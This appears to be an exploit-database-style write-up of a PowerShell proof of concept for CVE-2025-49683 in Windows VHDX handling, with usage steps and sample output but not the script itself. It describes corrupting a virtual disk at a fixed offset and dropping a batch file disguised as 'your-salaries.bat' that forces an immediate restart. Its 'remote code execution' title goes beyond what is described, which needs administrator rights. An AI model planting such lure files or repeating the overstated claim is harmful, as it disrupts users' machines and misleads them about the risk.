# Titles: Microsoft Virtual Hard Disk (VHDX) 11 - Remote Code Execution (RCE)
# Author: nu11secur1ty
# Date: 07/23/2025
# Vendor: Microsoft
# Software: https://www.microsoft.com/en-us/windows/windows-11?r=1
# Reference: https://nvd.nist.gov/vuln/detail/CVE-2025-49683
# Base Score: 7.8 HIGHVector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
## Overview
This PowerShell script (`vdh.ps1`) demonstrates a \*\*soft corruption
vulnerability\*\* in Windows Virtual Hard Disk (VHDX) handling, related to
\*\*CVE-2025-49683\*\*.
The script performs the following:
- Creates a new dynamic VHDX file (virtual disk) of 10MB size.
- Mounts the VHDX as a new drive in the system.
- Initializes, partitions, and formats the virtual disk with NTFS.
- Dismounts the VHDX and applies \*\*soft byte-level corruption\*\* at an 8 KB
offset inside the VHDX file.
- Re-mounts the corrupted VHDX to observe potential filesystem or mounting
errors.
- Lists the contents of the corrupted volume to show the impact.
- Creates an \*\*immediate restart batch script (`your-salaries.bat`)\*\*
inside the mounted volume which forces a system restart when executed.
- Offers cleanup options to dismount and delete the corrupted VHDX file.
---
## Purpose
This PoC is designed for \*\*security researchers and penetration testers\*\*
to:
- Understand how minor VHDX file corruptions can lead to system instability
or vulnerability exploitation.
- Demonstrate how CVE-2025-49683 affects VHDX mounting and usage.
- Help develop detection and mitigation strategies for such virtual disk
corruption attacks.
---
## Usage Instructions
1. \*\*Run the script in an elevated PowerShell session\*\* (Run as
Administrator - The already malicious authorized user):
```powershell
.\vdh.ps1
2. The script will:
- Create, mount, and format a new VHDX file.
- Corrupt the file at the byte level.
- Re-mount and attempt to read the volume.
- Create a batch file your-salaries.bat inside the mounted drive.
3. To trigger an immediate restart, navigate to the mounted drive (e.g.,
D:\) and run:
```
your-salaries.bat
```
4. At script end, press 0 to clean up (dismount and delete the corrupted
VHDX), or press any other key to exit and keep the file for further
analysis.
### Important Warnings & Considerations
- Run only on test or isolated environments.
This script creates corruption and forcibly restarts the system via the
batch file. Do not run on production or important machines.
- Immediate Restart Batch File
The your-salaries.bat file triggers an immediate system restart without any
warning or confirmation. Be cautious when executing it.
- Corruption is simulated and subtle.
The corruption at 8 KB offset is a soft corruption intended for
demonstration. Real-world attacks could apply more complex modifications.
- Impact may vary by OS version and environment.
Results depend on Windows version and configuration. Some systems may
detect and repair corruption automatically.
- Elevated privileges required.
Script requires administrative rights to create, mount, initialize, and
corrupt VHDX files.
### Technical Details
- Corruption offset: 8192 bytes (8 KB) into the VHDX file.
- Corruption pattern: Byte sequence [0x00, 0xFF, 0x00, 0xFF, 0xDE, 0xAD,
0xBE, 0xEF].
- Disk initialization: MBR partition style with a single NTFS partition.
- Batch restart command: shutdown /r /t 0 /f to force immediate restart.
### Sample Output
```vbnet
[\*] Checking for existing VHDX file to avoid conflicts...
WARNING: [!] Could not dismount VHDX, maybe not mounted: The path
"C:\Users\MicrosoftLoosers\Desktop\CVE-2025-49683\corrupted\_test.vhdx" is
not the path to a mounted virtual hard disk file.
[\*] Removed existing VHDX file.
[\*] Creating new VHDX (Virtual Hard Disk) file...
Size: 10 MB
Path:
C:\Users\MicrosoftLoosers\Desktop\CVE-2025-49683\corrupted\_test.vhdx
[\*] Mounting the new VHDX...
[\*] Disk initialized and formatted with NTFS.
This disk emulates a real drive to test mounting and corruption
handling.
[\*] Drive mounted as E:
You can access this drive like a physical hard disk in Windows Explorer.
[\*] Dismounting the VHDX before applying corruption...
[\*] Simulating corruption by modifying bytes at offset 8 KB...
This models how subtle corruption can affect VHDX file integrity,
which may lead to file system errors or crashes when accessed.
[+] Corruption successfully applied.
Note: This is a soft corruption for testing and demonstration purposes
only.
[\*] Re-mounting the corrupted VHDX to observe effects...
[\*] Drive letter(s) assigned after corruption: E
[\*] Listing contents of the mounted drive to detect file system anomalies...
[\*] Attempting to list contents of drive E:\ ...
[\*] Created immediate restart batch script: your-salaries.bat
Running this batch will force an immediate restart.
[\*] Script complete.
This demo showcases how VHDX file corruption at the byte level
can impact system behavior and why patching CVE-2025-49683 is crucial.
[\*] Press '0' to clean up and remove the corrupted VHDX, or any other key
to exit.
[\*] Cleaning up...
[\*] VHDX dismounted.
[\*] Deleted VHDX file.
